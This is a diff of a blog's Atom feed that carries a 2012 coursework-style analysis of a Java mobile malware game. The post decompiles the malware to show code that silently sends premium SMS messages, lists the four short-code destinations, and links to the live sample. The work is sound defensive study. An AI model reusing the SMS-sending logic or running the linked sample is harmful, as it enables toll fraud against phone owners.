@@ -1,12 +1,10 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom"><title>Predrag TASEVSKI - Pece - cell phone</title><link href="https://predragtasevski.com/" rel="alternate"></link><link href="https://predragtasevski.com/feeds/tag/cell-phone.atom.xml" rel="self"></link><id>https://predragtasevski.com/</id><updated>2012-01-17T00:00:00+01:00</updated><entry><title>Mobile Malware Analysis</title><link href="https://predragtasevski.com/posts/2012/01/mobile-malware-analysis/" rel="alternate"></link><published>2012-01-17T00:00:00+01:00</published><updated>2012-01-17T00:00:00+01:00</updated><author><name>Predrag TASEVSKI - Pece</name></author><id>tag:predragtasevski.com,2012-01-17:/posts/2012/01/mobile-malware-analysis/</id><summary type="html">&lt;h1&gt;PURPOSE&lt;/h1&gt;
 &lt;/p&gt;
-
 &lt;p&gt;The goal of this post is to identify and analyze mobile malware file:
 &lt;a href="https://sim.cert.ee/hw/mmc.jar"&gt;mmc.jar&lt;/a&gt;. Thereby please follow the
 following steps for completing the task:&lt;/p&gt;
 &lt;/p&gt;
-
 &lt;ul&gt;
 &lt;li&gt;Unpack the file (hint – using zip on .jar)&lt;/span&gt;&lt;/li&gt;
 &lt;li&gt;Examine .class files using tool available
@@ -16,12 +14,10 @@ following steps for completing the task:&lt;/p&gt;
     &lt;a href="https://sim.cert.ee/hw/jd-gui-0.3.3.windows.zip"&gt;Win&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;Find …&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;h1&gt;PURPOSE&lt;/h1&gt;
 &lt;/p&gt;
-
 &lt;p&gt;The goal of this post is to identify and analyze mobile malware file:
 &lt;a href="https://sim.cert.ee/hw/mmc.jar"&gt;mmc.jar&lt;/a&gt;. Thereby please follow the
 following steps for completing the task:&lt;/p&gt;
 &lt;/p&gt;
-
 &lt;ul&gt;
 &lt;li&gt;Unpack the file (hint – using zip on .jar)&lt;/span&gt;&lt;/li&gt;
 &lt;li&gt;Examine .class files using tool available
@@ -35,7 +31,6 @@ following steps for completing the task:&lt;/p&gt;
     IDE&lt;/a&gt;.&lt;/li&gt;
 &lt;/ul&gt;
 &lt;/p&gt;
-
 &lt;p&gt;Firstly, we are going to analysis the Java source code after
 decompilation. The accent is to find the code that is sending an SMSes
 using the ‘sms://’ URL. After identifying the linking associated classes
@@ -43,20 +38,16 @@ we have to compile the code to move toward to final results of URLs. For
 this purpose we are using the developing tool &lt;a href="http://www.eclipse.org/downloads/"&gt;Eclipse
 IDE&lt;/a&gt;.&lt;/p&gt;
 &lt;/p&gt;
-
 &lt;p&gt;Therefore, the results and the sent SMSes URLs are going to be presented
 into conclusion section. Which will complete the task and will yield the
 basic analysis of mobile malware file.&lt;/p&gt;
 &lt;/p&gt;
-
 &lt;h1&gt;ANALYSIS&lt;/h1&gt;
 &lt;/p&gt;
-
 &lt;p&gt;After running the decompiler tool we are examining and analyzing the
 Java source code. Whereby on the source code on the class M.class line
 343 we have found the following source code:&lt;/p&gt;
 &lt;/p&gt;
-
 &lt;div class="highlight"&gt;
 
     if ((i &amp;gt;= 35)  (SM.isSending != true)  (i % 6 == 0) (f &amp; count_query)) {  if (SM.GS()) f += 1;   if (f == 1) {            RS.L(rs);            RS.L("Slide");            rs = RS.j("Slide");            game = RS.L(rs, Integer.toString((int)(System.currentTimeMillis() / 1000L)));            RS.L(rs);   }if (f &amp;lt; count_query) {  game = SM.send("sms://" + ms[1][b], ms[2][b]); // sms://  if (b == count_query) b = 1; else b += 1;}
@@ -64,11 +55,9 @@ Java source code. Whereby on the source code on the class M.class line
 &lt;/div&gt;
 
 &lt;/p&gt;
-
 &lt;p&gt;The above code is associated with the class SM.class. With the following
 source code:&lt;/p&gt;
 &lt;/p&gt;
-
 &lt;div class="highlight"&gt;
 
     public static int send(String s, String s1){   if (isSending) return 0;      new SM(s, s1);   return -1;}public SM(String s, String s1) { success = false; isSending = true; this.destination = s; this.message = s1; try {      Thread thread = new Thread(this);      thread.start(); } catch (Exception exception) { isSending = false;}
@@ -76,22 +65,18 @@ source code:&lt;/p&gt;
 &lt;/div&gt;
 
 &lt;/p&gt;
-
 &lt;p&gt;The above code is checking if the message and the destination is
 correct  &lt;/p&gt;
 &lt;p&gt;and if the message is sent. Coloration is more like the first public
 static method named &lt;em&gt;send&lt;/em&gt; with the two string values of &lt;em&gt;s&lt;/em&gt; and &lt;em&gt;s1&lt;/em&gt;.&lt;/p&gt;
 &lt;/p&gt;
-
 &lt;p&gt;All the above extraction was finished by JD-Gui version 0.3.3 and
 JD-Core version 0.6.0 and using the menu bar for search, with the
 criteria that will meet our needs.&lt;/p&gt;
 &lt;/p&gt;
-
 &lt;p&gt;The bellow are executable results presented, done by eclipse after
 compiling the code:&lt;/p&gt;
 &lt;/p&gt;
-
 &lt;div class="highlight"&gt;
 
     /0SIF|6XI8ULE|YNLD5QDA6WM|YJ90RL/+WPJDAFY2 DC3QJ/+3RKA/5YPA0MD-5QFDwhile 7375/88600168904|7202/65510006691|1899/FTEME 1283|8385/88600168904|1 162 333 494 667375 88600168904 //sms://73757202 65510006691 //sms://72021899 fteme 1283 //sms://18998385 88600168904 //sms://8385decoded367375 88600168904427202 65510006691481899 fteme 128354
@@ -99,14 +84,11 @@ compiling the code:&lt;/p&gt;
 &lt;/div&gt;
 
 &lt;/p&gt;
-
 &lt;p&gt;From the above presented results after compiling the code we have
 identify the number of SMSes URLs and in addition the exact URLs.&lt;/p&gt;
 &lt;/p&gt;
-
 &lt;h1&gt;CONCLUSION&lt;/h1&gt;
 &lt;/p&gt;
-
 &lt;p&gt;We live in a world where nowadays for everyday work, communication, etc.
 the most essentially tool is our mobile phones, smart phones, etc. We
 used them for communication, sending SMS, playing games, checking
@@ -119,12 +101,10 @@ for mobile phones. However, this is only a basic, and a good guide to
 give you an idea of what kind of tools, applications you should have.
 This task is done only for a Java source code mobile malware game.&lt;/p&gt;
 &lt;/p&gt;
-
 &lt;p&gt;Furthermore, from the above section we have identify the number of SMSes
 that are sent and to what numbers. The total number of SMSes is 4 and
 sent to the following URLs:&lt;/p&gt;
 &lt;/p&gt;
-
 &lt;div class="highlight"&gt;
 
     sms://7375sms://7202sms://1899sms://8385
@@ -132,16 +112,13 @@ sent to the following URLs:&lt;/p&gt;
 &lt;/div&gt;
 
 &lt;/p&gt;
-
 &lt;p&gt;Finally, mobile malware is rising and it is about to explode, therefore
 users need education[1]. By delivering basic and advance mobile malware
 security awareness program we will have less malware attacks and better
 security policy into everyday mobile, smart phones usage.&lt;/p&gt;
 &lt;/p&gt;
-
 &lt;h1&gt;Bibliography&lt;/h1&gt;
 &lt;/p&gt;
-
 &lt;p&gt;[1] Chris Martin, Mobile malware is about to explode, users need
 education, 20 Jan. 2012,
 &lt;a href="http://www.theinquirer.net/inquirer/opinion/2140338/mobile-malware-explode-users-education"&gt;http://www.theinquirer.net/inquirer/opinion/2140338/mobile-malware-explode-users-education&lt;/a&gt;&lt;/p&gt;
